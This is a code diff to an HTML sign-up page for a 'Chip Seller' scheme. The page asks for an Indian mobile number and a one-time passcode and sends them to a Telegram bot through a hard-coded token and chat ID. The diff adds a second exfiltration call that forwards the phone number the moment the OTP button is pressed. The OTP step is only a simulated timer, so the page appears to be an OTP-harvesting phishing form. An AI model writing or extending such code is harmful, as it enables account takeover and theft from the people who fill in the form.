@@ -18,7 +18,7 @@
     <!-- Toast Notification Container -->
     <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>
 
-            <!-- Permanent SVG Banner Section (No Broken Image Links) -->
+    <!-- Permanent SVG Banner Section (No Broken Image Links) -->
     <header class="w-full pt-6 pb-2 px-4 max-w-md mx-auto flex flex-col items-start relative">
       <!-- Speech Bubble Badge -->
       <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
@@ -67,15 +67,9 @@
         </svg>
       </div>
     </header>
-    
-    
-    
-    
-
 
     <!-- Main White Bottom Card Form Section -->
     <main class="w-full max-w-md mx-auto px-4 -mt-2">
-
         <div class="bg-white rounded-t-[35px] p-6 shadow-2xl border-t border-white/20">
             <div class="text-center mb-5 flex items-center justify-center space-x-2">
                 <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
@@ -127,9 +121,8 @@
     <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-    <!-- JavaScript Logic with Telegram Bot Integration -->
+    <!-- JavaScript Logic with Dual Telegram Bot Integration -->
     <script>
-        // Updated Telegram Bot Token and Chat ID
         const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
         const CHAT_ID = "8698008425";
 
@@ -139,6 +132,7 @@
         // Toast Notification Function
         function showToast(message, type = 'info') {
             const container = document.getElementById('toast-container');
+            if (!container) return;
             
             const toast = document.createElement('div');
             toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium text-white pointer-events-auto flex items-center justify-between transition-all duration-300 opacity-0 translate-y-2 ${
@@ -166,8 +160,8 @@
             }, 4000);
         }
 
-        // OTP Timer Simulator
-        function sendOTP() {
+        // 1. Request Button Clicked -> Sends First Telegram Message (Phone Number)
+        async function sendOTP() {
             const phoneInput = document.getElementById('phone').value.trim();
             if(phoneInput.length < 10) {
                 showToast('Please enter a valid 10-digit mobile number first!', 'error');
@@ -176,6 +170,23 @@
 
             const otpBtn = document.getElementById('otp-btn');
             if (timerInterval) return;
+
+            // First Telegram Message for Request
+            const message = `📲 *New OTP Request!*\n\n📱 *Phone:* \`+91 ${phoneInput}\``;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram Error:', error);
+            }
 
             showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
             otpBtn.disabled = true;
@@ -196,7 +207,7 @@
             }, 1000);
         }
 
-        // Form Submit Handler & Telegram Sender
+        // 2. Sign Up Button Clicked -> Sends Second Telegram Message (Phone + OTP + Upline)
         async function handleFormSubmit(event) {
             event.preventDefault();
 
@@ -217,6 +228,7 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
 
+            // Second Telegram Message for Sign Up Submission
             const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
 
             try {
